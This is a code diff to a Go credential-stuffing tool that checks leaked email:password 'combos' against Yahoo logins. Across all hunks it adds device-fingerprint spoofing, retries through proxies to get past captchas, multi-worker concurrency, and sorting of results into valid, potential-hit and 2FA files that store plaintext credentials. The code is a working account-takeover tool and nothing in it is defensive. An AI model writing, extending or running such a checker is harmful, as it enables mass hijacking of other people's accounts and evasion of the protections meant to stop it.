-func fetchExitIP(client tls_client.HttpClient) (string, error) {
+func fetchExitIP(client tls_client.HttpClient, fp deviceFP) (string, error) {
 	endpoints := []string{
 		"https://api.ipify.org?format=json",
 		"https://httpbin.org/ip",
@@ -775,7 +1059,7 @@ func fetchExitIP(client tls_client.HttpClient) (string, error) {
 	}
 	ipRe := regexp.MustCompile(`\b(\d{1,3}(?:\.\d{1,3}){3})\b`)
 	for _, ep := range endpoints {
-		raw, _, _, err := doRequest(client, http.MethodGet, ep, "", nil, true)
+		raw, _, _, err := doRequest(client, http.MethodGet, ep, "", fp.headers(nil), true)
 		if err != nil {
 			continue
 		}
@@ -798,18 +1082,113 @@ func ensureResultDir() {
 	_ = os.MkdirAll(resultDir, 0o755)
 }
 
+type resultKind int
+
+const (
+	resultValid resultKind = iota
+	resultInvalid
+	resultCaptcha
+	resultPotentialHit
+	result2FA
+)
+
+type runStats struct {
+	Valid        int
+	Invalid      int
+	Captcha      int
+	PotentialHit int
+	TwoFA        int
+}
+
+func isCaptchaReason(reason string) bool {
+	r := strings.ToLower(strings.TrimSpace(reason))
+	return strings.HasPrefix(r, "captcha")
+}
+
+func isProxyIssueReason(reason string) bool {
+	r := strings.ToLower(strings.TrimSpace(reason))
+	return strings.HasPrefix(r, "proxy issue") ||
+		strings.Contains(r, "could not resolve exit ip") ||
+		strings.Contains(r, "proxy")
+}
+
+func isRetryableReason(reason string) bool {
+	return isCaptchaReason(reason) || isProxyIssueReason(reason)
+}
+
+func classifyError(err error, responseHint string) (resultKind, string) {
+	reason := firstLine(err.Error())
+	switch {
+	case isCaptchaReason(reason):
+		return resultCaptcha, reason
+	case isProxyIssueReason(reason), isProxyNetworkError(err):
+		return resultCaptcha, "proxy issue"
+	case isPotentialHitReason(reason):
+		return resultPotentialHit, reason
+	case is2FAReason(reason):
+		return result2FA, reason
+	default:
+		return resultInvalid, reason
+	}
+}
+
+func isProxyNetworkError(err error) bool {
+	if err == nil {
+		return false
+	}
+	msg := strings.ToLower(err.Error())
+	needles := []string{
+		"could not resolve exit ip",
+		"proxy",
+		"timeout",
+		"i/o timeout",
+		"connection refused",
+		"connection reset",
+		"tls handshake",
+		"no such host",
+		"network is unreachable",
+		"broken pipe",
+		"eof",
+	}
+	for _, n := range needles {
+		if strings.Contains(msg, n) {
+			return true
+		}
+	}
+	return false
+}
+
+func isPotentialHitReason(reason string) bool {
+	return strings.HasPrefix(strings.ToLower(strings.TrimSpace(reason)), "potential-hit")
+}
+
+func is2FAReason(reason string) bool {
+	return strings.HasPrefix(strings.ToLower(strings.TrimSpace(reason)), "2fa")
+}
+
 func resetResultDir() {
 	ensureResultDir()
 	_ = os.WriteFile(validFile, []byte{}, 0o644)
 	_ = os.WriteFile(invalidFile, []byte{}, 0o644)
+	_ = os.WriteFile(captchaFile, []byte{}, 0o644)
+	_ = os.WriteFile(potentialHitFile, []byte{}, 0o644)
+	_ = os.WriteFile(twoFAFile, []byte{}, 0o644)
 }
 
-func saveComboResult(ok bool, login Combo, detail string) {
+func saveComboResult(kind resultKind, login Combo, detail string) {
 	ensureResultDir()
 	combo := login.Email + ":" + login.Password
 	line := combo + "\n"
 	file := validFile
-	if !ok {
+	switch kind {
+	case result2FA:
+		file = twoFAFile
+	case resultPotentialHit:
+		file = potentialHitFile
+	case resultCaptcha:
+		file = captchaFile
+		line = combo + " | " + detail + "\n"
+	case resultInvalid:
 		file = invalidFile
 		line = combo + " | " + detail + "\n"
 	}
@@ -841,39 +1220,66 @@ func stamp(checked int) string {
 	return fmt.Sprintf("%ds | cpm=%d", sec, cpm)
 }
 
-func formatComboLine(ok bool, checked, total int, login Combo, ip, detail string) string {
+func formatComboLine(kind resultKind, checked, total int, login Combo, ip, detail, response string) string {
 	color := cBrightRed
 	status := "FAIL"
-	if ok {
+	switch kind {
+	case resultValid:
 		color = cBrightGreen
 		status = "OK"
+	case resultCaptcha:
+		color = cBrightYellow
+		if isProxyIssueReason(detail) {
+			status = "PROXY"
+		} else {
+			status = "CAPTCHA"
+		}
+	case resultPotentialHit:
+		color = cBrightMagenta
+		status = "POTENTIAL-HIT"
+	case result2FA:
+		color = cBrightBlue
+		status = "2FA"
 	}
 	if ip == "" {
 		ip = "n/a"
 	}
 	detail = strings.ReplaceAll(strings.ReplaceAll(detail, "\r", " "), "\n", " ")
-	line := fmt.Sprintf(
-		"%s [%d/%d] %s:%s | ip=%s | %s | %s",
-		status, checked, total, login.Email, login.Password, ip, detail, stamp(checked),
+	main := fmt.Sprintf(
+		"%s [%d/%d] %s | %s:%s | ip=%s | %s",
+		status, checked, total, stamp(checked), login.Email, login.Password, ip, detail,
 	)
-	return paint(color, line)
+	line := paint(color, main)
+	response = compactResponse(response)
+	if response != "" {
+		line += paintGray(" | " + response)
+	}
+	return line
 }
 
-func runWithWorkers(combos []Combo, concurrency int) int {
+func runWithWorkers(combos []Combo, concurrency int) runStats {
 	if concurrency > len(combos) {
 		concurrency = len(combos)
 	}
 	jobs := make(chan Combo)
-	var failed atomic.Int64
+	var validN, invalidN, captchaN, potentialN, twoFAN atomic.Int64
 	var checked atomic.Int64
 	var wg sync.WaitGroup
 
 	worker := func() {
 		defer wg.Done()
 		for login := range jobs {
-			ok := checkCombo(login, &checked, len(combos))
-			if !ok {
-				failed.Add(1)
+			switch checkCombo(login, &checked, len(combos)) {
+			case resultValid:
+				validN.Add(1)
+			case resultCaptcha:
+				captchaN.Add(1)
+			case resultPotentialHit:
+				potentialN.Add(1)
+			case result2FA:
+				twoFAN.Add(1)
+			default:
+				invalidN.Add(1)
 			}
 		}
 	}
@@ -887,39 +1293,87 @@ func runWithWorkers(combos []Combo, concurrency int) int {
 	}
 	close(jobs)
 	wg.Wait()
-	return int(failed.Load())
+	return runStats{
+		Valid:        int(validN.Load()),
+		Invalid:      int(invalidN.Load()),
+		Captcha:      int(captchaN.Load()),
+		PotentialHit: int(potentialN.Load()),
+		TwoFA:        int(twoFAN.Load()),
+	}
 }
 
-func checkCombo(login Combo, checked *atomic.Int64, total int) bool {
-	client, err := createSessionClient()
-	if err != nil {
-		n := int(checked.Add(1))
-		saveComboResult(false, login, err.Error())
-		fmt.Println(formatComboLine(false, n, total, login, "", firstLine(err.Error())))
-		return false
-	}
-	defer client.CloseIdleConnections()
+func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
+	const maxAttempts = 3
 
-	ip, err := fetchExitIP(client)
-	if err != nil {
+	var (
+		lastKind   resultKind
+		lastIP     string
+		lastDetail string
+		lastResp   string
+	)
+
+	for attempt := 1; attempt <= maxAttempts; attempt++ {
+		fp := newDeviceFP()
+		client, err := createSessionClient()
+		if err != nil {
+			lastKind = resultCaptcha
+			lastIP = ""
+			lastDetail = "proxy issue"
+			lastResp = firstLine(err.Error())
+			if attempt < maxAttempts {
+				continue
+			}
+			break
+		}
+
+		ip, err := fetchExitIP(client, fp)
+		if err != nil {
+			client.CloseIdleConnections()
+			lastKind = resultCaptcha
+			lastIP = ""
+			lastDetail = "proxy issue"
+			lastResp = firstLine(err.Error())
+			if attempt < maxAttempts {
+				continue
+			}
+			break
+		}
+
+		result, err := yahooHTTPLogin(client, login, fp)
+		client.CloseIdleConnections()
+		if err == nil {
+			n := int(checked.Add(1))
+			saveComboResult(resultValid, login, "")
+			fmt.Println(formatComboLine(resultValid, n, total, login, ip, "iri="+result.IRI, result.Response))
+			return resultValid
+		}
+
+		kind, detail := classifyError(err, result.Response)
+		lastKind = kind
+		lastIP = ip
+		lastDetail = detail
+		lastResp = result.Response
+
+		if isRetryableReason(detail) && attempt < maxAttempts {
+			continue
+		}
+
 		n := int(checked.Add(1))
-		saveComboResult(false, login, err.Error())
-		fmt.Println(formatComboLine(false, n, total, login, "", firstLine(err.Error())))
-		return false
+		saveComboResult(kind, login, detail)
+		fmt.Println(formatComboLine(kind, n, total, login, ip, detail, result.Response))
+		return kind
 	}
 
-	iri, err := yahooHTTPLogin(client, login)
 	n := int(checked.Add(1))
-	if err != nil {
-		reason := firstLine(err.Error())
-		saveComboResult(false, login, reason)
-		fmt.Println(formatComboLine(false, n, total, login, ip, reason))
-		return false
+	if lastKind == 0 {
+		lastKind = resultCaptcha
 	}
-
-	saveComboResult(true, login, "")
-	fmt.Println(formatComboLine(true, n, total, login, ip, "iri="+iri))
-	return true
+	if lastDetail == "" {
+		lastDetail = "proxy issue"
+	}
+	saveComboResult(lastKind, login, lastDetail)
+	fmt.Println(formatComboLine(lastKind, n, total, login, lastIP, lastDetail, lastResp))
+	return lastKind
 }
 
 func firstLine(s string) string {
